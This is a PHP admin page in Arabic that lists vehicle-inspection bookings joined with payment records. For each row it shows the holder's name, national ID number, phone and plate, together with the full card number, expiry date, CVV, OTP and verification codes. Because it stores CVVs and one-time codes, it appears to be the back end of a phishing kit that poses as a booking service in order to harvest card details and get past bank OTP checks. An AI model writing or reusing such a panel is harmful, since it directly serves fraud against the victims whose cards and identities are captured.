<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
include 'db.php';

$sql = "SELECT 
            a.id, a.fullname, a.idnumber, a.phone, a.vehiclenumber,
            a.registrationtype, a.vehicletype, a.inspectiontype,
            a.city, a.date, a.time, a.created_at AS booking_created,
            p.cardholder, p.cardnumber, p.expiry_month, p.expiry_year,
            p.cvv, p.otp_code, p.verification_code, p.phone_number,
            p.phone_verification_code, p.created_at AS payment_created
        FROM appointments a
        LEFT JOIN payments p ON a.id = p.appointment_id
        ORDER BY a.id DESC";

$result = $conn->query($sql);
if (!$result) {
    die("خطأ في الاستعلام: " . $conn->error);
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>لوحة التحكم - الحجوزات والدفع</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Tajawal', sans-serif; background-color: #f9f9f9; }
    .table-container { padding: 30px; overflow-x: auto; }
    table { background-color: white; border-radius: 10px; overflow: hidden; }
    th { background-color: #d4edda; color: #333; white-space: nowrap; }
    td { white-space: nowrap; }
    h3 { margin-bottom: 20px; }
  </style>
</head>
<body>

<div class="container-fluid table-container">
  <h3>جميع الحجوزات ومعلومات الدفع</h3>
  <table class="table table-bordered table-striped text-center">
    <thead>
      <tr>
        <th>الاسم</th>
        <th>الهوية</th>
        <th>الجوال</th>
        <th>رقم اللوحة</th>
        <th>التسجيل</th>
        <th>نوع المركبة</th>
        <th>نوع الفحص</th>
        <th>المدينة</th>
        <th>التاريخ</th>
        <th>الوقت</th>
        <th>تاريخ الحجز</th>
        <th>صاحب البطاقة</th>
        <th>رقم البطاقة</th>
        <th>تاريخ الانتهاء</th>
        <th>CVV</th>
        <th>OTP</th>
        <th>رمز التحقق</th>
        <th>رقم الجوال للدفع</th>
        <th>رمز التحقق للجوال</th>
        <th>تاريخ الدفع</th>
      </tr>
    </thead>
    <tbody>
      <?php while($row = $result->fetch_assoc()): ?>
      <tr>
        <td><?= htmlspecialchars($row['fullname'] ?? '') ?></td>
<td><?= htmlspecialchars($row['idnumber'] ?? '') ?></td>
<td><?= htmlspecialchars($row['phone'] ?? '') ?></td>
<td><?= htmlspecialchars($row['vehiclenumber'] ?? '') ?></td>
<td><?= htmlspecialchars($row['registrationtype'] ?? '') ?></td>
<td><?= htmlspecialchars($row['vehicletype'] ?? '') ?></td>
<td><?= htmlspecialchars($row['inspectiontype'] ?? '') ?></td>
<td><?= htmlspecialchars($row['city'] ?? '') ?></td>
<td><?= htmlspecialchars($row['date'] ?? '') ?></td>
<td><?= htmlspecialchars($row['time'] ?? '') ?></td>
<td><?= htmlspecialchars($row['booking_created'] ?? '') ?></td>
<td><?= htmlspecialchars($row['cardholder'] ?? '') ?></td>
<td><?= htmlspecialchars($row['cardnumber'] ?? '') ?></td>
<td><?= htmlspecialchars($row['expiry_month'] ?? '') ?></td>
<td><?= htmlspecialchars($row['expiry_year'] ?? '') ?></td>
<td><?= htmlspecialchars($row['cvv'] ?? '') ?></td>
<td><?= htmlspecialchars($row['otp_code'] ?? '') ?></td>
<td><?= htmlspecialchars($row['verification_code'] ?? '') ?></td>
<td><?= htmlspecialchars($row['phone_number'] ?? '') ?></td>
<td><?= htmlspecialchars($row['phone_verification_code'] ?? '') ?></td>
<td><?= htmlspecialchars($row['payment_created'] ?? '') ?></td>
      </tr>
      <?php endwhile; ?>
    </tbody>
  </table>
</div>

</body>
</html>
